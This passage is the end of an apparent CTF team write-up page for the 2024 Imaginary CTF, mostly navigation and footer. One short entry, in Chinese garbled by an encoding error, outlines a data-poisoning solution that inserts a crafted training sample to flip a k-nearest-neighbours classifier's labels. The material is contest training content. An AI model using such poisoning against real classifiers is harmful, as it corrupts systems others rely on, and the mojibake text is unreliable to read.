<li>solver Whale120<br>é¡Œç›®å¤§è‡´ä¸Šå°±æ˜¯ä»¥ä¸€å †æ•¸åˆ—ç‚ºDataSetï¼Œä»¥Ké„°è¿‘ç®—æ³•åšè³‡æ–™åˆ¤åˆ¥ä»–ç‚ºfriend&#x2F;enemy<br>ç„¶å¾Œæœ‰ä¸€æ¬¡æ’å…¥è¨“ç·´çµæœçš„æ©Ÿæœƒï¼Œç›®æ¨™æ˜¯è®“æŸå…©çµ„è³‡æ–™å¾enemyè®Šæˆfriendã€‚<br>æˆ‘çš„æƒ³æ³•å°±æ˜¯æŠŠéœ€è¦æ±¡æŸ“çš„å…©çµ„è³‡æ–™ä¸€å€‹å–å‰é¢å¹¾å€‹ï¼Œå‰©ä¸‹æ¥ä¸Šå¾Œé¢çš„æ•¸åˆ—ï¼Œæœ€å¾Œå®£å‘Šä»–æ˜¯friendlyï¼Œå› ç‚ºKé„°è¿‘æœƒå»å–è·é›¢ï¼Œé€šå¸¸(?)é€™æ¨£æ‡‰è©²å°±å¤ æŠŠè·é›¢æ‹‰è¿‘ã„Œ</li>
</ul>
<p><img src="https://hackmd.io/_uploads/H1Q47jcu0.png" alt="image"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readme"><span class="toc-number">3.1.</span> <span class="toc-text">readme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#journal"><span class="toc-number">3.2.</span> <span class="toc-text">journal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Amazing-Race"><span class="toc-number">3.3.</span> <span class="toc-text">The Amazing Race</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P2C"><span class="toc-number">3.4.</span> <span class="toc-text">P2C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crystals"><span class="toc-number">3.5.</span> <span class="toc-text">Crystals</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64"><span class="toc-number">4.1.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#integrity"><span class="toc-number">4.2.</span> <span class="toc-text">integrity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSING"><span class="toc-number">5.</span> <span class="toc-text">REVERSING</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unoriginal"><span class="toc-number">5.1.</span> <span class="toc-text">unoriginal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RUST"><span class="toc-number">5.2.</span> <span class="toc-text">RUST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bf"><span class="toc-number">5.3.</span> <span class="toc-text">bf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unconditional"><span class="toc-number">5.4.</span> <span class="toc-text">unconditional</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">6.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#imgstore"><span class="toc-number">6.1.</span> <span class="toc-text">imgstore</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FORENSICS"><span class="toc-number">7.</span> <span class="toc-text">FORENSICS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crash"><span class="toc-number">7.1.</span> <span class="toc-text">crash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bom"><span class="toc-number">7.2.</span> <span class="toc-text">bom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#packed"><span class="toc-number">7.3.</span> <span class="toc-text">packed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#routed"><span class="toc-number">7.4.</span> <span class="toc-text">routed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cartesian-1"><span class="toc-number">7.5.</span> <span class="toc-text">cartesian-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cartesian-2"><span class="toc-number">7.6.</span> <span class="toc-text">cartesian-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cartesian-3"><span class="toc-number">7.7.</span> <span class="toc-text">cartesian-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dog-mom"><span class="toc-number">7.8.</span> <span class="toc-text">dog-mom</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">8.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanity-check"><span class="toc-number">8.1.</span> <span class="toc-text">sanity-check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#discord"><span class="toc-number">8.2.</span> <span class="toc-text">discord</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Locked"><span class="toc-number">8.3.</span> <span class="toc-text">Locked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sussy"><span class="toc-number">8.4.</span> <span class="toc-text">sussy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#starship"><span class="toc-number">8.5.</span> <span class="toc-text">starship</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&text=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&is_video=false&description=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2024 Imaginary CTF Write Up by ICEDTEA&body=Check out this article: http://wha13.github.io/2024/07/25/2024-imaginary-ctf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&name=2024 Imaginary CTF Write Up by ICEDTEA&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&t=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
